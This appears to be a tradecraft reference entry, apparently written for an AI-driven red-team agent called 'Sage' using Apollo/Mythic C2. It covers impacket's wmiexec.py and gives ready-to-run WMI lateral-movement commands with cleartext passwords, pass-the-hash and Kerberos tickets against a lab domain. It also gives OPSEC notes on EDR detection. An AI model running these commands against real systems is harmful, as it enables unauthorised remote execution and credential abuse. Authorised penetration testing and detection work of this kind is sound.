---
name: impacket-wmiexec
category: lateral-movement
subcategories: [wmi-execution, remote-execution, fileless]
tradecraft_tags: [wmi, lateral-movement, impacket, python, remote-exec, semi-interactive]
mitre_attack:
  - id: T1047
    name: Windows Management Instrumentation
source:
  url: https://github.com/fortra/impacket
  license: Apache-2.0
  maintained: true
binary_type: python-script
binary_filename: wmiexec.py
supported_os: [linux]
architecture: [x64]
privilege_required: local-admin
network_required: true
detection_signal: |
  WMI lateral movement generates Event 4624 (logon type 3 - network logon) on the
  target, WMI process creation events (Event 4688 if process creation auditing is
  enabled), and Sysmon Event 20/21 (WmiEvent). Modern EDR (CrowdStrike, SentinelOne)
  behavioral signatures detect WMI-spawned process trees. WMI output capture uses a
  temporary file in ADMIN$ share.
usage_examples:
  - description: Remote command execution via WMI
    args: "wmiexec.py north.sevenkingdoms.local/administrator:Password123@192.168.56.22"
  - description: Pass-the-hash WMI execution
    args: "wmiexec.py -hashes :nthash north.sevenkingdoms.local/administrator@192.168.56.22"
  - description: Non-interactive single command
    args: "wmiexec.py north.sevenkingdoms.local/administrator:Password123@192.168.56.22 'whoami'"
  - description: Use Kerberos ticket
    args: "KRB5CCNAME=admin.ccache wmiexec.py -k -no-pass north.sevenkingdoms.local/administrator@192.168.56.22"
opsec_notes: |
  WMI execution creates a child process under WmiPrvSE.exe — behavioral EDR flags
  suspicious WmiPrvSE.exe child processes. impacket's output capture uses a temporary
  file in the ADMIN$ share, leaving a brief disk artifact. The WMI network logon is
  detectable. For Apollo-based lateral movement, prefer native methods (Apollo's
  `spawn` command or Mythic payload delivery) over WMI.
gotchas: |
  Python-only — not Apollo-runnable. WMI requires DCOM ports (TCP 135 + dynamic
  RPC range) to be accessible. Some firewalls block DCOM. The ADMIN$ share access
  for output capture requires C$ or ADMIN$ share access. For Kerberos-based exec,
  set `KRB5CCNAME` environment variable to the ccache file path.
related_ttps: [impacket-secretsdump, ntlmrelayx, rubeus]
alternatives: [crackmapexec-wmiexec, impacket-psexec, apollo-spawn]
common_args:
  target:
    description: Target in DOMAIN/user:pass@IP format
    typical_values: ["north.sevenkingdoms.local/admin:pass@192.168.56.22"]
    required: true
  -hashes:
    description: NTLM hashes (LM:NT)
    typical_values: [":nthash"]
  -k:
    description: Kerberos authentication (use with KRB5CCNAME env var)
    typical_values: [flag-only]
  -no-pass:
    description: No password prompt (use with -k)
    typical_values: [flag-only]
last_updated: 2026-05-29
---

# impacket-wmiexec

impacket's WMI-based remote command execution tool. Provides a semi-interactive shell
on remote Windows machines using WMI process creation, with output captured via a
temporary file in the ADMIN$ share. Supports password, hash, and Kerberos ticket
authentication. One of the standard lateral movement tools in Python-based attack
infrastructure.

## Typical use cases
- Semi-interactive shell on remote Windows machines using admin credentials
- Pass-the-hash lateral movement from Linux infrastructure
- Kerberos-based lateral movement using tickets from Rubeus/certipy
- One-shot command execution on remote hosts

## How Sage uses this
Infrastructure-side Python tooling. Apollo handles Windows-to-Windows lateral movement;
wmiexec is for Linux-to-Windows execution paths.

## Apollo-specific note
Python/Linux only. For lateral movement from within Apollo, use Apollo's spawn/inject
commands or a second Mythic payload.
